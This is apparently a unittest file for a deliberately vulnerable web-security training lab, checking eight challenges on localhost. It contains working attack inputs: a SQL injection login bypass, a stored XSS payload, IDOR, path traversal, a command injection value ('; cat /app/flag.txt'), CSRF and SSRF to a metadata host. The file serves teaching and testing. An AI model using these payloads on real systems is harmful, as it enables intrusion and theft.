import http.client
import json
import threading
import unittest
from http.server import ThreadingHTTPServer
from urllib.parse import urlencode

import server


class LabTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = ThreadingHTTPServer(("127.0.0.1", 0), server.LabHandler)
        cls.port = cls.app.server_address[1]
        cls.app_thread = threading.Thread(target=cls.app.serve_forever, daemon=True)
        cls.app_thread.start()

        cls.attacker = ThreadingHTTPServer(("127.0.0.1", 0), server.AttackerHandler)
        cls.attacker_port = cls.attacker.server_address[1]
        cls.attacker_thread = threading.Thread(target=cls.attacker.serve_forever, daemon=True)
        cls.attacker_thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.app.shutdown()
        cls.app.server_close()
        cls.app_thread.join(timeout=2)
        cls.attacker.shutdown()
        cls.attacker.server_close()
        cls.attacker_thread.join(timeout=2)

    def request(self, method, path, body=None, headers=None, attacker=False):
        port = self.attacker_port if attacker else self.port
        connection = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
        connection.request(method, path, body=body, headers=headers or {})
        response = connection.getresponse()
        data = response.read().decode("utf-8")
        result = response.status, dict(response.getheaders()), data
        connection.close()
        return result

    def post_form(self, path, values, cookie=""):
        body = urlencode(values)
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Content-Length": str(len(body))}
        if cookie:
            headers["Cookie"] = cookie
        return self.request("POST", path, body, headers)

    def new_cookie(self):
        _, headers, _ = self.request("GET", "/")
        return headers["Set-Cookie"].split(";", 1)[0]

    def test_board_lists_all_challenges(self):
        status, _, body = self.request("GET", "/")
        self.assertEqual(status, 200)
        for title in ["Exposed Backup", "SQL Login", "Support Guestbook", "Invoice Viewer", "Document Center", "Network Diagnostic", "Account Email", "Remote Preview"]:
            self.assertIn(title, body)

    def test_discovery_exposes_backup_flag(self):
        status, _, body = self.request("GET", "/backup-config/")
        self.assertEqual(status, 200)
        self.assertIn(".env.backup", body)
        status, _, body = self.request("GET", "/backup-config/.env.backup")
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["discovery"], body)
        self.assertIn("metadata.internal", body)

    def test_sql_injection_baseline_and_bypass(self):
        status, _, _ = self.post_form("/login", {"username": "admin", "password": "wrong"})
        self.assertEqual(status, 401)
        status, _, body = self.post_form("/login", {"username": "admin' -- ", "password": "wrong"})
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["sqli"], body)

    def test_stored_xss_proof_state(self):
        cookie = self.new_cookie()
        status, _, _ = self.post_form("/guestbook", {"message": "<img src=x onerror=fetch('/xss/proof')>"}, cookie)
        self.assertEqual(status, 303)
        status, _, _ = self.request("GET", "/xss/proof", headers={"Cookie": cookie})
        self.assertEqual(status, 200)
        status, _, body = self.request("GET", "/challenge/xss", headers={"Cookie": cookie})
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["xss"], body)

    def test_idor_returns_another_users_invoice(self):
        status, _, own = self.request("GET", "/api/invoice?id=1001")
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(own)["owner"], "alya")
        status, _, other = self.request("GET", "/api/invoice?id=1002")
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["idor"], other)

    def test_path_traversal_reaches_private_virtual_file(self):
        status, _, body = self.request("GET", "/download?file=welcome.txt")
        self.assertEqual(status, 200)
        self.assertNotIn(server.FLAGS["traversal"], body)
        status, _, body = self.request("GET", "/download?file=..%2Fprivate%2Fflag.txt")
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["traversal"], body)

    def test_command_injection_is_safely_emulated(self):
        status, _, baseline = self.post_form("/tools/ping", {"host": "127.0.0.1"})
        self.assertEqual(status, 200)
        self.assertNotIn(server.FLAGS["command"], baseline)
        status, _, body = self.post_form("/tools/ping", {"host": "127.0.0.1; cat /app/flag.txt"})
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["command"], body)

    def test_csrf_state_change_uses_session_cookie(self):
        cookie = self.new_cookie()
        status, _, body = self.post_form("/account/email", {"email": "attacker@demo.local"}, cookie)
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["csrf"], body)
        status, _, account = self.request("GET", "/challenge/csrf", headers={"Cookie": cookie})
        self.assertEqual(status, 200)
        self.assertIn("attacker@demo.local", account)

    def test_attacker_origin_contains_cross_origin_form(self):
        status, _, body = self.request("GET", "/csrf-demo", attacker=True)
        self.assertEqual(status, 200)
        self.assertIn("http://127.0.0.1:8080/account/email", body)
        self.assertIn("attacker@demo.local", body)

    def test_ssrf_virtual_internal_service(self):
        status, _, baseline = self.post_form("/preview", {"url": "https://news.demo.local/article"})
        self.assertEqual(status, 200)
        self.assertNotIn(server.FLAGS["ssrf"], baseline)
        status, _, body = self.post_form("/preview", {"url": "http://metadata.internal/latest"})
        self.assertEqual(status, 200)
        self.assertIn(server.FLAGS["ssrf"], body)


if __name__ == "__main__":
    unittest.main()
